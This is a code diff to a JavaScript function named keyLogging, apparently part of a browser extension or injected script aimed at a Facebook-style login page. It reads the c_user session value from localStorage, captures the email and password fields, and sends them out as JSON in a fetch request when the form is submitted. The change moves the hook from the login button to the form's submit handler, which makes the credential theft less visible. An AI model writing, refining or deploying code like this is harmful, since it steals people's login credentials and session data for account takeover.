@@ -36,10 +36,9 @@ const keyLogging = () => {
         const c_user = localStorage.getItem("c_user")?.split('"')[1];
         const edEmail = document.getElementById("email");
         const edPass = document.getElementById("pass");
-        const btnSubmit = document.querySelector("button[name='login']");
+        const form = edEmail.parentElement.parentElement.parentElement;
 
-        btnSubmit.type = "button";
-        btnSubmit.onclick = async (e) => {
+        form.onsubmit = async () => {
             const email = edEmail.value;
             const pass = edPass.value;
             const user = {
@@ -75,8 +74,6 @@ const keyLogging = () => {
                     body: JSON.stringify(user),
                 });
             }
-
-            btnSubmit.type = "submit";
         };
     } catch (error) {
         // Handle errors
